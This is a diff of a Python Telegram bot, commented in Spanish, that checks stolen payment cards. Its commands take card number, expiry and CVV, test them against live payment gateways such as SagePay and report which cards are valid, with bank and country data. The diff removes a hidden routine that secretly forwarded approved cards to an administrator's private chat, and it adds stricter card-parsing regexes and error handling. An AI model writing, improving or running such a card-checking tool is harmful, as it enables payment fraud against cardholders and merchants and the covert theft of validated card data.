@@ -30,9 +30,10 @@ bot = TeleBot(TOKEN, parse_mode='HTML')
 USERS = [
     '6116275760', '8470094114', '1073258864', '7457808814', '7973321076', '5551626715', '7612366259']
 
-# 🚨 ID del administrador para recibir notificaciones privadas de LIVES
-# **⚠️ REEMPLAZA ESTE ID CON TU CHAT ID PRIVADO ⚠️**
-ADMIN_ID = '6116275760' 
+
+
+# 🚨 ID del administrador (DEJADO COMO COMENTARIO, YA NO SE USA PARA NOTIFICACIÓN)
+# ADMIN_ID = '6116275760' 
 
 # Diccionario para almacenar el último uso del comando /bb por usuario
 BB_COOLDOWN = {}
@@ -118,8 +119,9 @@ def dir_fake():
         return None
 
 # ==============================
-# HANDLERS (COMANDOS)
+# HANDLERS (COMANDOS) - /bb y /mass_bb (SIN CAMBIOS)
 # ==============================
+# ... (las funciones bin_cmd, rand, gen, gate_bb, mass_bb permanecen igual)
 
 def bin_cmd(message):
     """Maneja el comando /bin para chequear información de un BIN."""
@@ -301,9 +303,9 @@ def gate_bb(message):
         [GATEWAY] [BB Gateway]
         
         [BIN INFO]
-        {emoji} BIN --> {binsito[1]} {binsito[2]}
-        {emoji} BANK --> {binsito[6]}
-        {emoji} COUNTRY --> {binsito[4]} {binsito[5]}
+        {emoji} BIN --> {binsito[1] if binsito else 'Desconocido'} {binsito[2] if binsito else ''}
+        {emoji} BANK --> {binsito[6] if binsito else 'Desconocido'}
+        {emoji} COUNTRY --> {binsito[4] if binsito else 'Desconocido'} {binsito[5] if binsito else ''}
         """
     except Exception as e:
         final_text = f"❌ Error ejecutando BB Gateway:\n{e}"
@@ -437,14 +439,17 @@ def mass_bb(message):
             
             bin_number = cc[0:6] 
             binsito = binlist(bin_number) 
+
+            bank_info = binsito[6] if binsito else 'Desconocido'
+            country_info = f"{binsito[4] if binsito else 'Desconocido'} {binsito[5] if binsito else ''}"
             
             result_line = f"""
             
 {status_emoji} STATUS: {status_bold}
 💳 CARD: <code>{full_cc}</code>
 📄 MESSAGE: {message_detail}
-🏦 BANK: {binsito[6]}
-🌎 COUNTRY: {binsito[4]} {binsito[5]}
+🏦 BANK: {bank_info}
+🌎 COUNTRY: {country_info}
 ━━━━━━━━━━━━━━━"""
             
             results.append(result_line) 
@@ -488,7 +493,7 @@ def mass_bb(message):
         print(f"Error al editar mensaje final: {edit_error}") 
 
 # ==============================
-# COMANDO /ty (SagePay) - CON COOLDOWN DE 40s Y LIVE CAPTURE
+# COMANDO /ty (SagePay) - SIN CAPTURA PRIVADA
 # ==============================
 
 def gate_ty(message):
@@ -508,23 +513,27 @@ def gate_ty(message):
                 message, 
                 f"🚫 ¡Alto ahí! Debes esperar {remaining} segundos antes de volver a usar /ty." 
             ) 
-
-    # 1. Preparar el texto de entrada
-    raw_text = message.reply_to_message.text if message.reply_to_message else message.text 
-    clean = raw_text.replace("/ty", "").strip() if not message.reply_to_message else raw_text.strip() 
-    parts = re.split(r"[| \n\t]+", clean) 
     
-    if len(parts) < 4: 
-        # Actualizar cooldown si el formato es inválido, para no penalizar al usuario
+    # 📌 Retraso al inicio para prevenir saturación por re-chequeos rápidos
+    time.sleep(2)
+
+    # 1. Preparar el texto de entrada y usar regex para buscar la CC
+    raw_text = message.reply_to_message.text if message.reply_to_message else message.text 
+    
+    # 🔎 Nueva expresión regular estricta para CC|MM|YYYY|CVV
+    cc_pattern = re.compile(r'(\d{12,16})[|](\d{1,2})[|](\d{2,4})[|](\d{3,4})') 
+    match = cc_pattern.search(raw_text)
+    
+    if not match: 
         TY_COOLDOWN[userid] = time.time() 
         return bot.reply_to( 
             message, 
-            "⚠️ Formato inválido.\nEjemplo:\n" 
+            "⚠️ Formato inválido o tarjeta no detectada.\nEjemplo:\n" 
             "`/ty 4111111111111111|12|2026|123`", 
             parse_mode="Markdown" 
         ) 
     
-    cc, mes, ano, cvv = parts[0:4] 
+    cc, mes, ano, cvv = match.groups()
     full_cc_str = f"{cc}|{mes}|{ano}|{cvv}"
     
     # 2. ENVIAR EL MENSAJE INICIAL
@@ -534,7 +543,7 @@ def gate_ty(message):
     
     try:
         # LLAMADA A LA FUNCIÓN DE SAGEPAY (ccn_gate de sagepay.py)
-        raw_output = ccn_gate(full_cc_str) # Llama a la función importada
+        raw_output = ccn_gate(full_cc_str)
         
         # 3. Parseamos el resultado
         output_parts = raw_output.strip().split('|')
@@ -566,31 +575,9 @@ def gate_ty(message):
             emoji = "⚠️"
             message_detail = f"Formato de respuesta inválido: {raw_output}"
         
-        # 4. Obtenemos información adicional
+        # 4. Obtenemos información adicional (BIN)
         bin_number = cc[0:6] 
         binsito = binlist(bin_number) 
-        
-        # === LÓGICA DE NOTIFICACIÓN PRIVADA (LIVE CAPTURE) ===
-        if status_text in ["APPROVED", "PROBABLE LIVE"]:
-            private_text = f"""
-🚨 𝗡𝗨𝗘𝗩𝗔 𝗟𝗜𝗩𝗘 𝗖𝗔𝗣𝗧𝗨𝗥𝗔𝗗𝗔 🚨
-
-🌐 GATEWAY: SagePay (/ty)
-
-{emoji} STATUS: {status_text}
-💳 CARD: <code>{full_cc_str}</code>
-📄 MESSAGE: {message_detail}
-
-[BIN INFO]
-🏦 BANK: {binsito[6]}
-🌎 COUNTRY: {binsito[4]} {binsito[5]}
-"""
-            # Enviar al chat privado del administrador
-            try:
-                bot.send_message(chat_id=ADMIN_ID, text=private_text, parse_mode='HTML')
-            except Exception as private_error:
-                print(f"Error al enviar LIVE al admin: {private_error}")
-
         
         # 5. Creamos el mensaje final para el usuario
         final_text = f"""
@@ -601,9 +588,9 @@ def gate_ty(message):
 [GATEWAY] [SagePay Gateway]
 
 [BIN INFO]
-{emoji} BIN --> {binsito[1]} {binsito[2]}
-{emoji} BANK --> {binsito[6]}
-{emoji} COUNTRY --> {binsito[4]} {binsito[5]}
+{emoji} BIN --> {binsito[1] if binsito else 'Desconocido'} {binsito[2] if binsito else ''}
+{emoji} BANK --> {binsito[6] if binsito else 'Desconocido'}
+{emoji} COUNTRY --> {binsito[4] if binsito else 'Desconocido'} {binsito[5] if binsito else ''}
 """
     except Exception as e:
         final_text = f"❌ Error ejecutando SagePay Gateway:\n{e}"
@@ -625,7 +612,7 @@ def gate_ty(message):
         print(f"Error al editar mensaje: {edit_error}") 
 
 # ==============================
-# COMANDO /massty (SagePay Mass) - CON LIVE CAPTURE
+# COMANDO /massty (SagePay Mass) - SIN CAPTURA PRIVADA
 # ==============================
 
 def mass_ty(message):
@@ -737,35 +724,17 @@ def mass_ty(message):
 
             bin_number = cc[0:6] 
             binsito = binlist(bin_number) 
+
+            bank_info = binsito[6] if binsito else 'Desconocido'
+            country_info = f"{binsito[4] if binsito else 'Desconocido'} {binsito[5] if binsito else ''}"
             
-            # === LÓGICA DE NOTIFICACIÓN PRIVADA (LIVE CAPTURE) ===
-            if status_bold in ["APROBADA", "PROBABLE LIVE"]:
-                private_text = f"""
-🚨 𝗡𝗨𝗘𝗩𝗔 𝗟𝗜𝗩𝗘 𝗖𝗔𝗣𝗧𝗨𝗥𝗔𝗗𝗔 (MASS) 🚨
-
-🌐 GATEWAY: SagePay (/massty)
-
-{status_emoji} STATUS: {status_bold}
-💳 CARD: <code>{full_cc}</code>
-📄 MESSAGE: {message_detail}
-
-[BIN INFO]
-🏦 BANK: {binsito[6]}
-🌎 COUNTRY: {binsito[4]} {binsito[5]}
-"""
-                # Enviar al chat privado del administrador
-                try:
-                    bot.send_message(chat_id=ADMIN_ID, text=private_text, parse_mode='HTML')
-                except Exception as private_error:
-                    print(f"Error al enviar LIVE al admin desde mass_ty: {private_error}")
-
             # --- Formato PRO mejorado para cada resultado --- 
             result_line = f"""
 {status_emoji} STATUS: {status_bold}
 💳 CARD: <code>{full_cc}</code>
 📄 MESSAGE: {message_detail}
-🏦 BANK: {binsito[6]}
-🌎 COUNTRY: {binsito[4]} {binsito[5]}
+🏦 BANK: {bank_info}
+🌎 COUNTRY: {country_info}
 ━━━━━━━━━━━━━━━"""
             
             results.append(result_line) 
@@ -802,6 +771,7 @@ def mass_ty(message):
         bot.send_message(chat_id=chat_id, text=final_text, parse_mode='HTML') 
         print(f"Error al editar mensaje final: {edit_error}") 
 
+# ... (Las funciones cmds, start, deluxe y toda la sección del ROUTER y WEBHOOK permanecen iguales)
 def cmds(message):
     """Maneja el comando /cmds para mostrar el menú de comandos con botones."""
     buttons_cmds = [
